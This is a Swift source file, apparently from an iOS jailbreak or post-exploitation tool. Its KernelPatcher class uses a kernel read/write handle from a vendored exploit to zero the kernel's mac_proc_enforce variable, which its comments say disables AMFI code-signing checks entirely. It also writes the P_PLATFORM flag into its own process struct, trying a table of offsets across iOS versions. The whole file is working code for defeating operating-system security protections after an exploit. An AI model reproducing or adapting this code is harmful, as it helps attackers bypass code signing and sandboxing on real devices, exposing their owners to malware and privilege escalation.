import Foundation

public final class KernelPatcher {
    private let handle: KernelRwHandle
    private let kernelBase: UInt64

    /// Known effective offsets for p_flag in the proc struct across iOS versions.
    /// Each entry is: (min_kernel_version, max_kernel_version, p_flag_offset)
    private static let pFlagOffsets: [(min: ClosedRange<Int>, offset: Int)] = [
        (223...239, 0xBC),   // XNU 8796-8798 (iOS 16.x)
        (240...249, 0xBC),   // XNU 879x-9068 (iOS 17.x)
        (250...279, 0xC4),   // XNU 9068+ (iOS 18.x) — updated for A13+
        (280...319, 0xC4),   // XNU ~9200+ (iOS 19.x)
        (320...359, 0xC4),   // XNU ~9500+ (iOS 20.x–21.x)
        (360...399, 0xCC),   // XNU ~9800+ (iOS 22.x–23.x)
        (400...499, 0xCC),   // XNU 10000+ (iOS 24.x–26.x)
    ]
    private static let pPlatform: UInt32 = 0x80000000

    public init(handle: KernelRwHandle, kernelBase: UInt64) {
        self.handle = handle
        self.kernelBase = kernelBase
    }

    // -----------------------------------------------------------------------
    // Direct trust cache injection (DSPloit approach)
    // -----------------------------------------------------------------------

    /// Disable MAC (Mandatory Access Control) process enforcement by zeroing the
    /// `mac_proc_enforce` kernel variable. This bypasses AMFI code signing checks
    /// entirely — no trust cache injection needed.
    ///
    /// `mac_proc_enforce` is a boolean/uint32 that the MAC framework checks before
    /// enforcing any MAC policy on process operations (including AMFI's code
    /// signing validation). Setting it to 0 causes all MAC process enforcement
    /// checks to pass unconditionally.
    ///
    /// The variable's offset is resolved via getmacprocenforceoff() from the
    /// vendored LARA kexploit, which uses XPF's patchfinder to find the
    /// "proc_enforce" string reference in the kernel and trace it to the variable.
    ///
    /// - Returns: true if mac_proc_enforce was successfully zeroed
    @discardableResult
    public func disableMACProcEnforce() -> Bool {
        LogManager.shared.append("disableMACProcEnforce: resolving mac_proc_enforce...", tag: "KernelPatcher")
        print("[D] disableMACProcEnforce: calling getmacprocenforceoff()...")

        let offset = getmacprocenforceoff()
        guard offset > 0 else {
            LogManager.shared.append("mac_proc_enforce offset resolution failed", tag: "KernelPatcher")
            return false
        }

        let address = kernelBase + offset
        LogManager.shared.append("mac_proc_enforce at 0x\(String(address, radix: 16))", tag: "KernelPatcher")

        // Read current value
        guard let currentData = handle.kread(address, 4) else {
            LogManager.shared.append("Cannot read mac_proc_enforce", tag: "KernelPatcher")
            return false
        }
        let currentValue = currentData.withUnsafeBytes { $0.load(as: UInt32.self) }
        LogManager.shared.append("mac_proc_enforce current value: \(currentValue)", tag: "KernelPatcher")

        // Zero it
        var zero: UInt32 = 0
        let zeroData = Data(bytes: &zero, count: 4)
        guard handle.kwrite(address, zeroData) else {
            LogManager.shared.append("Failed to write mac_proc_enforce = 0", tag: "KernelPatcher")
            return false
        }

        // Verify
        guard let verifyData = handle.kread(address, 4) else {
            LogManager.shared.append("Cannot verify mac_proc_enforce", tag: "KernelPatcher")
            return false
        }
        let verifyValue = verifyData.withUnsafeBytes { $0.load(as: UInt32.self) }
        guard verifyValue == 0 else {
            LogManager.shared.append("mac_proc_enforce verify failed: \(verifyValue) != 0", tag: "KernelPatcher")
            return false
        }

        LogManager.shared.append("mac_proc_enforce zeroed ✓ — AMFI code signing disabled", tag: "KernelPatcher")
        print("[D] disableMACProcEnforce: SUCCESS (\(currentValue) → 0)")
        return true
    }

    // -----------------------------------------------------------------------
    // Platform-application fallback via direct proc manipulation
    // -----------------------------------------------------------------------

    /// Last-resort fallback: directly set P_PLATFORM flag on our process.
    /// This bypasses the need for developer_mode_status entirely for
    /// platform-application entitlement checks.
    @discardableResult
    public func enablePlatformApplication() -> Bool {
        guard let procAddr = findOurProc() else {
            LogManager.shared.append("Could not find our proc", tag: "KernelPatcher")
            return false
        }

        // Try known p_flag offsets
        for entry in Self.pFlagOffsets {
            let flagAddr = procAddr + UInt64(entry.offset)
            guard let flags = handle.kread(flagAddr, 4) else { continue }
            let currentFlags = flags.withUnsafeBytes { $0.load(as: UInt32.self) }

            if currentFlags & Self.pPlatform == Self.pPlatform {
                LogManager.shared.append("P_PLATFORM already set (offset 0x\(String(entry.offset, radix: 16)))", tag: "KernelPatcher")
                return true
            }

            let newFlags = currentFlags | Self.pPlatform
            var writeData = newFlags
            let rawData = Data(bytes: &writeData, count: 4)

            if handle.kwrite(flagAddr, rawData) {
                if let check = handle.kread(flagAddr, 4) {
                    let checkVal = check.withUnsafeBytes { $0.load(as: UInt32.self) }
                    if checkVal & Self.pPlatform == Self.pPlatform {
                        LogManager.shared.append("P_PLATFORM set at offset 0x\(String(entry.offset, radix: 16)) ✓", tag: "KernelPatcher")
                        return true
                    }
                }
            }
        }

        LogManager.shared.append("Could not set P_PLATFORM", tag: "KernelPatcher")
        return false
    }

    /// Get our own proc struct address. Uses DarkSword's exported function.
    private func findOurProc() -> UInt64? {
        let addr = ds_get_our_proc()
        return addr > 0 ? addr : nil
    }

    // -----------------------------------------------------------------------
    // Apply all patches
    // -----------------------------------------------------------------------

    /// Apply post-exploit kernel patches.
    ///
    /// Sets P_PLATFORM on our process (kernel r/w only, no XPF needed).
    /// Returns false if kernelBase itself is invalid (panic-level failure).
    /// Note: disableMACProcEnforce() should be called separately after this.
    @discardableResult
    public func applyAll() -> Bool {
        print("[D] applyAll: kernelBase = 0x\(String(kernelBase, radix: 16))")
        LogManager.shared.append("applyAll started", tag: "KernelPatcher")
        guard kernelBase > 0 else {
            LogManager.shared.append("Invalid kernelBase: cannot patch", tag: "KernelPatcher")
            return false
        }
        let platformOK = enablePlatformApplication()
        if platformOK {
            LogManager.shared.append("P_PLATFORM set on our process ✓", tag: "KernelPatcher")
        } else {
            LogManager.shared.append("Could not set P_PLATFORM — fallthrough, sandbox+offsets may still work", tag: "KernelPatcher")
        }
        return true
    }
}
